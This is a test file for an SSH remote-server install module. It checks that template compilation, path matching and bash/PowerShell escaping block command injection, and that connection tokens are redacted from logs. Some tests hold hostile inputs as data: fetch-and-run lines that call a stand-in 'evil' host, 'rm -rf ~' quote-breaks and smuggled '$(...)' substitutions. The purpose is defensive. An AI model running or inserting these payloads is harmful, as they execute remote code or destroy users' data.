import { execFileSync } from 'child_process';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { escapePowerShellArg, escapeShellArg } from '../src/common/shellQuote';
import {
    compileTemplate,
    escapeCustomInstallPath,
    findServerInstallPath,
    generateBashInstallScript,
    generatePowerShellInstallScript,
    parseServerInstallOutput,
    redactConnectionToken,
    ServerInstallOptions,
} from '../src/serverSetup';

// `compileTemplate` reads `<extensionPath>/src/scripts/<templateName>` off
// disk, so tests write throwaway template files into a tmpdir shaped like
// that layout rather than mocking `fs` — same pattern as `serverConfig.test.ts`.
describe('compileTemplate', () => {
    let extensionPath: string;

    beforeEach(async () => {
        extensionPath = await fs.promises.mkdtemp(path.join(os.tmpdir(), 'compile-template-test-'));
        await fs.promises.mkdir(path.join(extensionPath, 'src', 'scripts'), { recursive: true });
    });

    afterEach(async () => {
        await fs.promises.rm(extensionPath, { recursive: true, force: true });
    });

    async function writeTemplate(name: string, content: string): Promise<void> {
        await fs.promises.writeFile(path.join(extensionPath, 'src', 'scripts', name), content);
    }

    it('replaces a plain placeholder', async () => {
        await writeTemplate('t.sh', 'VALUE="%%KEY%%"');
        expect(compileTemplate('t.sh', { KEY: 'hello' }, extensionPath)).toBe('VALUE="hello"');
    });

    it('replaces every occurrence of a repeated placeholder', async () => {
        await writeTemplate('t.sh', '%%KEY%% and %%KEY%% again');
        expect(compileTemplate('t.sh', { KEY: 'x' }, extensionPath)).toBe('x and x again');
    });

    it('inserts a value containing "$&" verbatim instead of the regex-match special pattern', async () => {
        // String.prototype.replace(regex, someString) treats "$&" in the
        // *replacement string* as "insert the whole match" — a raw
        // `content.replace(re, value)` call would corrupt any value
        // containing "$&" by re-inserting "%%KEY%%" into the output. The
        // fix uses a replacer function `() => value` so the value is always
        // inserted literally.
        await writeTemplate('t.sh', 'VALUE="%%KEY%%"');
        expect(compileTemplate('t.sh', { KEY: 'contains $& literally' }, extensionPath))
            .toBe('VALUE="contains $& literally"');
    });

    it('inserts a value containing "$$" verbatim instead of a collapsed literal dollar', async () => {
        // "$$" in a replacement string means "insert a literal $" (i.e.
        // collapses to a single "$") under the buggy raw-string replace.
        await writeTemplate('t.sh', 'VALUE="%%KEY%%"');
        expect(compileTemplate('t.sh', { KEY: 'contains $$ literally' }, extensionPath))
            .toBe('VALUE="contains $$ literally"');
    });
});

// `findServerInstallPath` resolves a per-host custom install path
// (`remote.SSH.serverInstallPath`) from a hostname -> path map whose keys may
// be `Host`-style wildcard patterns; `matchHostnamePattern` (unexported, only
// reachable through this) decides which pattern wins. No test exists yet.
describe('findServerInstallPath', () => {
    it('prefers an exact match over any wildcard', () => {
        const pathMap = { '*': '/opt/general', '*.example.com': '/opt/subdomain', 'host.example.com': '/opt/exact' };
        expect(findServerInstallPath('host.example.com', pathMap)).toBe('/opt/exact');
    });

    it('prefers a more specific wildcard over the catch-all', () => {
        const pathMap = { '*': '/opt/general', '*.example.com': '/opt/subdomain' };
        expect(findServerInstallPath('host.example.com', pathMap)).toBe('/opt/subdomain');
    });

    it('falls back to the catch-all wildcard when nothing more specific matches', () => {
        const pathMap = { '*': '/opt/general', '*.example.com': '/opt/subdomain' };
        expect(findServerInstallPath('host.other.org', pathMap)).toBe('/opt/general');
    });

    it('picks the longer (more specific) of two matching wildcard patterns', () => {
        const pathMap = { '*.com': '/opt/short', '*.example.com': '/opt/long' };
        expect(findServerInstallPath('host.example.com', pathMap)).toBe('/opt/long');
    });

    it('escapes regex metacharacters in the pattern so "." only matches a literal dot', () => {
        // A naive wildcard->regex conversion that forgets to escape "." would let
        // "host.name" match "hostXname" (since unescaped "." means "any char").
        const pathMap = { 'host.name': '/opt/dotted' };
        expect(findServerInstallPath('hostXname', pathMap)).toBeUndefined();
        expect(findServerInstallPath('host.name', pathMap)).toBe('/opt/dotted');
    });

    it('returns undefined when no pattern matches', () => {
        expect(findServerInstallPath('unmatched.example.com', { 'other.example.com': '/opt/other' })).toBeUndefined();
    });

    it('returns undefined for an empty path map', () => {
        expect(findServerInstallPath('any.host', {})).toBeUndefined();
    });
});

describe('parseServerInstallOutput', () => {
    const scriptId = 'abc123';

    function wrap(lines: string): string {
        return `noise before\n${scriptId}: start\n${lines}\n${scriptId}: end\nnoise after`;
    }

    it('returns undefined when the start marker is missing', () => {
        expect(parseServerInstallOutput('no markers here', scriptId)).toBeUndefined();
    });

    it('returns undefined when the end marker is missing', () => {
        expect(parseServerInstallOutput(`${scriptId}: start\nexitCode==0==`, scriptId)).toBeUndefined();
    });

    it('parses a simple key==value== line', () => {
        const result = parseServerInstallOutput(wrap('exitCode==0=='), scriptId);
        expect(result).toEqual({ exitCode: '0' });
    });

    it('preserves "==" occurring inside the value', () => {
        const result = parseServerInstallOutput(wrap('listeningOn==http://x?a==b=='), scriptId);
        expect(result?.listeningOn).toBe('http://x?a==b');
    });

    it('skips blank lines instead of producing a bogus "" key', () => {
        const result = parseServerInstallOutput(wrap('exitCode==0==\n\nplatform==linux=='), scriptId);
        // toEqual is exact-shape: this also proves no stray `''` key exists.
        expect(result).toEqual({ exitCode: '0', platform: 'linux' });
    });

    it('parses multiple lines, including an empty value', () => {
        const result = parseServerInstallOutput(wrap('exitCode==0==\nconnectionToken====\narch==x64=='), scriptId);
        expect(result).toEqual({ exitCode: '0', connectionToken: '', arch: 'x64' });
    });
});

describe('escapeCustomInstallPath', () => {
    it('single-quotes a plain path', () => {
        expect(escapeCustomInstallPath('/opt/vscode-server')).toBe(`'/opt/vscode-server'`);
    });

    it('preserves spaces safely inside single quotes', () => {
        expect(escapeCustomInstallPath('/opt/my dir')).toBe(`'/opt/my dir'`);
    });

    it('neutralises a double-quote/backtick/command-substitution injection attempt', () => {
        const hostile = `/tmp"; rm -rf ~; echo "`;
        const expr = escapeCustomInstallPath(hostile);
        // Must be a single, fully single-quoted shell word: no unescaped
        // double quote can appear outside of the quoting the helper itself
        // controls.
        expect(expr).toBe(`'${hostile.replace(/'/g, `'\\''`)}'`);
    });

    it('expands a bare "~" to $HOME, unescaped', () => {
        expect(escapeCustomInstallPath('~')).toBe('$HOME');
    });

    it('expands a "~/…" prefix to $HOME while single-quoting the remainder', () => {
        expect(escapeCustomInstallPath('~/my dir')).toBe(`$HOME'/my dir'`);
    });

    it('does not expand "~user" (not a bare-home shorthand)', () => {
        expect(escapeCustomInstallPath('~root/foo')).toBe(`'~root/foo'`);
    });

    it('escapes an embedded single quote correctly (round-trips through the standard POSIX trick)', () => {
        expect(escapeCustomInstallPath(`/tmp/it's here`)).toBe(`'/tmp/it'\\''s here'`);
    });
});

// Exercise the real templates shipped in src/scripts/ so these tests would
// catch a template/TS-side mismatch (e.g. leaving a %%KEY%% wrapped in quotes
// that the escaping helper already supplies).
const extensionPath = path.join(__dirname, '..');

function baseOptions(overrides: Partial<ServerInstallOptions> = {}): ServerInstallOptions {
    return {
        id: 'script-id-123',
        quality: 'stable',
        commit: 'deadbeef',
        version: '1.90.0',
        release: '25026',
        extensionIds: [],
        envVariables: [],
        useSocketPath: false,
        serverApplicationName: 'code-server-oss',
        serverDataFolderName: '.vscode-server-oss',
        serverDownloadUrlTemplate: 'https://example.com/${commit}/${quality}-${version}',
        serverValidation: 'strict',
        ...overrides,
    };
}

function scriptLine(script: string, prefix: string): string | undefined {
    return script.split('\n').find(l => l.startsWith(prefix));
}

describe('generateBashInstallScript', () => {
    it('leaves no unreplaced %%KEY%% placeholder in the output', () => {
        const script = generateBashInstallScript(baseOptions({ customInstallPath: '/opt/my dir' }), extensionPath);
        expect(script).not.toMatch(/%%[A-Z_]+%%/);
    });

    it('single-quote-escapes a customInstallPath containing spaces and quotes', () => {
        const script = generateBashInstallScript(
            baseOptions({ customInstallPath: `/opt/my dir/it's "weird"` }),
            extensionPath
        );
        expect(script).toContain(`SERVER_DATA_DIR=${escapeCustomInstallPath(`/opt/my dir/it's "weird"`)}`);
    });

    it('round-trips a customInstallPath containing shell metacharacters as inert data (no injection)', () => {
        const hostile = '/tmp/`id`; $(whoami) "$(rm -rf ~)"';
        const script = generateBashInstallScript(baseOptions({ customInstallPath: hostile }), extensionPath);
        const line = script.split('\n').find(l => l.startsWith('SERVER_DATA_DIR='));
        expect(line).toBe(`SERVER_DATA_DIR=${escapeCustomInstallPath(hostile)}`);
    });

    it('single-quote-escapes the download URL template', () => {
        const script = generateBashInstallScript(
            baseOptions({ serverDownloadUrlTemplate: 'https://example.com/${version}; rm -rf ~' }),
            extensionPath
        );
        expect(script).toContain(`echo 'https://example.com/\${version}; rm -rf ~' | sed`);
    });

    // `remote.SSH.serverBinaryName` reached `SERVER_APP_NAME="%%SERVER_APP_NAME%%"`
    // verbatim, and bash evaluates `$( )`/backticks inside double quotes — so
    // the setting was a remote-code-execution vector exactly like the install
    // path and the URL template already fixed above.
    it('single-quote-escapes the server application name (no command substitution)', () => {
        const hostile = 'code-server$(curl -s http://evil/x|sh)`id`';
        const script = generateBashInstallScript(baseOptions({ serverApplicationName: hostile }), extensionPath);
        expect(scriptLine(script, 'SERVER_APP_NAME=')).toBe(`SERVER_APP_NAME=${escapeShellArg(hostile)}`);
    });
});

// server-setup.sh line ~257 expands the flag variables to build the server's
// argv. They used to be plain strings expanded *unquoted*, so the shell
// word-split and glob-expanded them: `escapeCustomInstallPath` produced a
// correct `SERVER_DATA_DIR`, and then `--server-data-dir="$SERVER_DATA_DIR"`
// silently split `/opt/my dir` into two argv entries. These tests pin the
// EFFECTIVE argv by running the generated preamble through a real bash — the
// old assertions only looked at the `SERVER_DATA_DIR=` line, which is exactly
// why the defect shipped.
describe('generateBashInstallScript (effective argv)', () => {
    function effectiveFlagArgv(script: string): string[] {
        const lines = script.split('\n');
        // Everything above `LISTENING_ON=` is pure variable assignment (no
        // command runs), so it is safe to source in isolation.
        const preamble = lines.slice(0, lines.indexOf('LISTENING_ON=')).join('\n');
        const invocation = lines.find(l => l.includes('--start-server'));
        expect(invocation).toBeDefined();
        // Take the flag expansions verbatim out of the shipped template so the
        // test breaks if the quoting there regresses.
        const flags = invocation!.substring(
            invocation!.indexOf('--host=127.0.0.1') + '--host=127.0.0.1'.length,
            invocation!.indexOf('--connection-token-file')
        ).trim();
        const stdout = execFileSync('bash', ['-c', `${preamble}\nprintf 'ARG:[%s]\\n' ${flags}`], { encoding: 'utf8' });
        return [...stdout.matchAll(/^ARG:\[(.*)\]$/gm)].map(m => m[1]).filter(a => a !== '');
    }

    it('passes a data dir containing a space as ONE argv entry', () => {
        const script = generateBashInstallScript(baseOptions({ customInstallPath: '/opt/my dir' }), extensionPath);
        expect(effectiveFlagArgv(script)).toEqual(['--port=0', '--server-data-dir=/opt/my dir']);
    });

    it('does not glob-expand a data dir containing a wildcard', () => {
        const script = generateBashInstallScript(baseOptions({ customInstallPath: '/*' }), extensionPath);
        expect(effectiveFlagArgv(script)).toEqual(['--port=0', '--server-data-dir=/*']);
    });

    it('passes a socket path containing a space as ONE argv entry', () => {
        const script = generateBashInstallScript(baseOptions({ useSocketPath: true }), extensionPath)
            // The generated `--socket-path="$TMP_DIR/…"` only word-splits when
            // $TMP_DIR itself has a space; force that here.
            .replace('TMP_DIR="${XDG_RUNTIME_DIR:-"/tmp"}"', 'TMP_DIR="/tmp/run dir"');
        const argv = effectiveFlagArgv(script);
        expect(argv).toHaveLength(1);
        expect(argv[0]).toMatch(/^--socket-path=\/tmp\/run dir\/vscode-server-sock-/);
    });

    it('emits no data-dir flag at all when no custom install path is configured', () => {
        const script = generateBashInstallScript(baseOptions(), extensionPath);
        expect(effectiveFlagArgv(script)).toEqual(['--port=0']);
    });

    it('installs every configured extension as its own argv pair', () => {
        const script = generateBashInstallScript(
            baseOptions({ extensionIds: ['ms-python.python', 'vscodevim.vim'] }),
            extensionPath
        );
        expect(effectiveFlagArgv(script)).toEqual([
            '--port=0',
            '--install-extension', 'ms-python.python',
            '--install-extension', 'vscodevim.vim',
        ]);
    });

    it('passes a hostile extension id through as inert data (no command substitution)', () => {
        // `remote.SSH.defaultExtensions: ["$(id > /tmp/pwned)"]` used to be
        // spliced into `SERVER_INITIAL_EXTENSIONS="…"` and evaluated. The
        // marker path is freshly generated so a leftover file from an earlier
        // (vulnerable) run can't mask a regression.
        const marker = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'ext-injection-')), 'pwned');
        const script = generateBashInstallScript(
            baseOptions({ extensionIds: [`$(id > ${marker})`] }),
            extensionPath
        );
        expect(effectiveFlagArgv(script)).toEqual(['--port=0', '--install-extension', `$(id > ${marker})`]);
        expect(fs.existsSync(marker)).toBe(false);
    });

    it('keeps the validation flag as a single argv entry', () => {
        const script = generateBashInstallScript(baseOptions({ serverValidation: 'skip' }), extensionPath);
        expect(effectiveFlagArgv(script)).toEqual(['--port=0', '--disable-client-validation']);
    });
});

// `generatePowerShellInstallScript` had zero tests, which is why the Windows
// side kept the injection the bash side had already closed.
describe('generatePowerShellInstallScript', () => {
    it('leaves no unreplaced %%KEY%% placeholder in the output', () => {
        const script = generatePowerShellInstallScript(baseOptions({ customInstallPath: 'C:\\srv' }), extensionPath);
        expect(script).not.toMatch(/%%[A-Z_]+%%/);
    });

    it('single-quotes a plain custom install path', () => {
        const script = generatePowerShellInstallScript(baseOptions({ customInstallPath: 'C:\\srv' }), extensionPath);
        expect(scriptLine(script, '$SERVER_DATA_DIR=')).toBe(`$SERVER_DATA_DIR='C:\\srv'`);
    });

    it('neutralises a `$(…)` subexpression in the custom install path', () => {
        // PoC: `remote.SSH.serverInstallPath: {"winbox": "<this>"}` executed
        // arbitrary PowerShell on the remote at connect, because the value
        // landed inside a double-quoted assignment where `$(…)` is evaluated.
        const hostile = 'C:\\srv$(iwr http://evil/x.ps1 -OutFile $env:TEMP\\x.ps1; & $env:TEMP\\x.ps1)';
        const script = generatePowerShellInstallScript(baseOptions({ customInstallPath: hostile }), extensionPath);
        expect(scriptLine(script, '$SERVER_DATA_DIR=')).toBe(`$SERVER_DATA_DIR=${escapePowerShellArg(hostile)}`);
    });

    it('neutralises a quote-break in the custom install path', () => {
        const hostile = 'C:\\srv"; iwr http://evil/x.ps1 | iex; "';
        const script = generatePowerShellInstallScript(baseOptions({ customInstallPath: hostile }), extensionPath);
        expect(scriptLine(script, '$SERVER_DATA_DIR=')).toBe(`$SERVER_DATA_DIR=${escapePowerShellArg(hostile)}`);
    });

    it('still expands a bare "~" via Resolve-Path', () => {
        // The bash side expands `~` through `$HOME`; PowerShell has no such
        // variable, so the equivalent is a `Resolve-Path ~` subexpression that
        // we emit ourselves (outside the escaped literal).
        const script = generatePowerShellInstallScript(baseOptions({ customInstallPath: '~' }), extensionPath);
        expect(scriptLine(script, '$SERVER_DATA_DIR=')).toBe(`$SERVER_DATA_DIR="$(Resolve-Path ~)"`);
    });

    it('expands a "~\\…" prefix and single-quotes the remainder', () => {
        const script = generatePowerShellInstallScript(baseOptions({ customInstallPath: '~\\my dir' }), extensionPath);
        expect(scriptLine(script, '$SERVER_DATA_DIR=')).toBe(`$SERVER_DATA_DIR="$(Resolve-Path ~)" + '\\my dir'`);
    });

    it('does not expand "~user"', () => {
        const script = generatePowerShellInstallScript(baseOptions({ customInstallPath: '~admin\\srv' }), extensionPath);
        expect(scriptLine(script, '$SERVER_DATA_DIR=')).toBe(`$SERVER_DATA_DIR='~admin\\srv'`);
    });

    it('defaults to the home-relative data folder, still Resolve-Path based', () => {
        const script = generatePowerShellInstallScript(baseOptions(), extensionPath);
        expect(scriptLine(script, '$SERVER_DATA_DIR=')).toBe(`$SERVER_DATA_DIR="$(Resolve-Path ~)" + '\\.vscode-server-oss'`);
    });

    it('neutralises an injection in the download URL template', () => {
        // PoC via `remote.SSH.serverDownloadUrlTemplate`.
        const script = generatePowerShellInstallScript(
            baseOptions({ serverDownloadUrlTemplate: 'https://example.com/${version}$(rm -r C:\\)' }),
            extensionPath
        );
        expect(scriptLine(script, '$SERVER_DOWNLOAD_URL='))
            .toBe(`$SERVER_DOWNLOAD_URL='https://example.com/1.90.0$(rm -r C:\\)'`);
    });

    it('neutralises an injection in the server application name', () => {
        // PoC via `remote.SSH.serverBinaryName`.
        const hostile = 'code-server$(iwr http://evil/x|iex)';
        const script = generatePowerShellInstallScript(baseOptions({ serverApplicationName: hostile }), extensionPath);
        expect(scriptLine(script, '$SERVER_APP_NAME=')).toBe(`$SERVER_APP_NAME=${escapePowerShellArg(hostile)}`);
    });

    it('escapes the extension ids individually so the nested `powershell -c` re-parse sees one token each', () => {
        const script = generatePowerShellInstallScript(
            baseOptions({ extensionIds: ['ms-python.python', '$(rm -r C:\\)'] }),
            extensionPath
        );
        // Outer literal is escaped once; its *value* is the inner escaping the
        // nested parser needs.
        expect(scriptLine(script, '$SERVER_INITIAL_EXTENSIONS='))
            .toBe(`$SERVER_INITIAL_EXTENSIONS=${escapePowerShellArg(`--install-extension 'ms-python.python' --install-extension '$(rm -r C:\\)'`)}`);
    });

    it('escapes the distro values (they are interpolated into the same double-quoted slots)', () => {
        const script = generatePowerShellInstallScript(baseOptions({ commit: 'dead$(beef)' }), extensionPath);
        expect(scriptLine(script, '$DISTRO_COMMIT=')).toBe(`$DISTRO_COMMIT='dead$(beef)'`);
    });
});

// `Log.trace` is not level-gated (src/common/logger.ts) — it always appends to
// the "Remote - SSH" output channel. Both the compiled install script and the
// script's stdout carry the server connection token, so a user pasting that
// channel into a bug report published the auth token for their remote server.
describe('redactConnectionToken', () => {
    it('redacts the token assignment in the bash script text', () => {
        expect(redactConnectionToken('SERVER_CONNECTION_TOKEN="0f1e-uuid"'))
            .toBe('SERVER_CONNECTION_TOKEN="<redacted>"');
    });

    it('redacts the token assignment in the PowerShell script text', () => {
        expect(redactConnectionToken(`$SERVER_CONNECTION_TOKEN='0f1e-uuid'`))
            .toBe(`$SERVER_CONNECTION_TOKEN='<redacted>'`);
    });

    it('redacts the connectionToken result line emitted on stdout', () => {
        expect(redactConnectionToken('connectionToken==0f1e-uuid==')).toBe('connectionToken==<redacted>==');
    });

    it('leaves an empty connectionToken result line alone', () => {
        // `connectionToken====` carries no secret; rewriting it would make the
        // log claim a token exists.
        expect(redactConnectionToken('connectionToken====')).toBe('connectionToken====');
    });

    it('keeps the rest of the diagnostic content intact', () => {
        const stdout = 'id: start\nexitCode==0==\nconnectionToken==0f1e-uuid==\nlisteningOn==1234==\nid: end';
        expect(redactConnectionToken(stdout))
            .toBe('id: start\nexitCode==0==\nconnectionToken==<redacted>==\nlisteningOn==1234==\nid: end');
    });

    it('removes the real token from a generated bash script', () => {
        // Pins the redaction pattern against the shipped template rather than
        // a hand-written sample of it.
        const script = generateBashInstallScript(baseOptions(), extensionPath);
        const token = script.match(/SERVER_CONNECTION_TOKEN="([^"]+)"/)?.[1];
        expect(token).toBeTruthy();
        expect(redactConnectionToken(script)).not.toContain(token!);
    });

    it('removes the real token from a generated PowerShell script', () => {
        const script = generatePowerShellInstallScript(baseOptions(), extensionPath);
        const token = script.match(/SERVER_CONNECTION_TOKEN='([^']+)'/)?.[1];
        expect(token).toBeTruthy();
        expect(redactConnectionToken(script)).not.toContain(token!);
    });
});
